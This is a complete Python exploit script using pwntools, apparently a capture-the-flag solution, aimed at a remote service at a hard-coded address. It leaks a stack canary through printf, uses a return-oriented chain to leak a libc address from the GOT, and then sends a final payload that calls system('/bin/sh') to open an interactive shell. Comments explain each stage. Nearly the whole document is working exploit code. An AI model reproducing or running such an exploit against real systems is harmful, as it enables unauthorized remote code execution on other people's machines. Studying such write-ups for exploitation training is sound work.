#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

# Author : yuan
# https://30cm.ml

host = "140.115.59.7"
port = 11005

yuan = remote(host,port)


pop_rdi = 0x0000000000400923
bin_sh_libc = 0x18c58b
puts_plt = 0x400600
read_GOT = 0x601038
read_libc = 0xf69a0
printf_GOT = 0x601028
libc_printf_offset = 0x557b0
libc_system_offset = 0x45380
main = 0x40078d

print "%%% Step 1: Use printf() to leak somthing."
p = 'a' * 137
print "%%% Payload 1 -> " + p
yuan.recvuntil(':')
yuan.send(p)
yuan.recvuntil('echo')
output = yuan.recvuntil('I')
#print "Print:" , output
canary_5858 = output[138:-1]
#canary = canary_5858[:-(len(canary_5858)-7)]
canary = canary_5858[:7]
print
print "===========step1 results==============="
print "%%% Printf leak ->" ,  canary_5858
print "%%% Canary ->" , canary
print "===========step1 results==============="
print

print "%%% Step 2: At this point, we can use canary we obtained after the first overflowing to overflow return address , thus we can use ROPgadgets."
print "%%% And use those skills to set up parameters for some function on @.plt which you want to use."
print "%%% Then try to caculate the real address of system function in libc."
print "%%% In this situation , I try to use puts@.plt to dump somethings from address of read@.got."
print "%%% The important thing is that , for payload 2 we use it in (exit) condition , so it work after the end of main(), therefor we have to push main() address on the stack for us to return to main() again."

p2 = 'exit' + "A"*132
p2 += '\x00'
p2 += canary
p2 += 'BBBBBBBB' * 2
p2 += "RBBBBBBP"
p2 += p64(pop_rdi)
p2 += p64(read_GOT)
p2 += p64(puts_plt)
p2 += p64(main)

print "%%% Payload 2 -> " + p2

yuan.send(p2)
print
print "===========step2 results==============="
yuan.recvuntil('~\n')
puts = yuan.recvuntil('\n')
print "%%% Call puts@plt's stdout ->" , puts
hh = ''.join(hex(ord(c)).replace('0x','') for c in puts[:-1])
ihh = int(hh,16)
print "%%% Hex ->" , hex(ihh)
rhh = hh[10:] + hh[8:-2] + hh[6:-4] + hh[4:-6] + hh[2:-8] + hh[:-10]
print "%%% Unpacked ->" + rhh
irhh = int(rhh,16)

libc_addr = irhh - read_libc
system_addr = libc_addr + libc_system_offset
bin_sh_addr = libc_addr + bin_sh_libc

print "%%% read_address ->" , hex(irhh)
print "%%% Libc_address ->" , hex(libc_addr)
print "%%% System_address ->" , hex(system_addr)
print "===========step2 results==============="
print
print "%%% Step 3: We got all stuffs we needed for calling syscall with the first x64 parameter $rdi =['/bin/sh'] , so ROP again to execve a shell."

p3 = 'exit' + "A"*132
p3 += '\x00'
p3 += canary
p3 += "BBBBBBBB" * 2
p3 += "RBBBBBBP"
p3 += p64(pop_rdi)
p3 += p64(bin_sh_addr)
p3 += p64(system_addr)

print "%%% Payload 3 -> " + p3
print
print "%%% Gaining Shell ..."
print

yuan.send(p3)

yuan.interactive()
